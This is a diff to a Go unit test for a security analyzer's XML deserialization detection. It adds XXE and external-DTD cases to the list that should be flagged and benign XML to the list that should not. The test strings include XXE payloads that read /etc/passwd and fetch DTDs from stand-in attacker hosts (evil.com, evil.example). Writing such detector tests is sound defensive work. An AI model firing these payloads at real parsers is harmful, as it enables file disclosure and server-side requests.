@@ -557,11 +557,20 @@ func TestAnalyzeInput_Deser_XMLEntity(t *testing.T) {
 	cases := []string{
 		`<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
 		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>`,
+		`<!DOCTYPE foo PUBLIC "-//EXAMPLE//DTD TEST//EN" "https://evil.example/a.dtd"><foo/>`,
+		`<!DOCTYPE foo SYSTEM "relative.dtd"><foo/>`,
+		"<!DOCTYPE\nfoo\nSYSTEM\n'relative.dtd'><foo/>",
+		`<!doctype foo public "identifier" "relative.dtd"><foo/>`,
 	}
 	for _, input := range cases {
 		detections := s.AnalyzeInput(input, "body")
 		if !hasCategory(detections, "deser") {
 			t.Errorf("expected deser detection for %q", input)
+		}
+	}
+	for _, input := range []string{`<foo>ordinary XML</foo>`, `<!DOCTYPE foo><foo/>`, `<!DOCTYPE html>`} {
+		if hasCategory(s.AnalyzeInput(input, "body"), "deser") {
+			t.Errorf("unexpected deser detection for %q", input)
 		}
 	}
 }
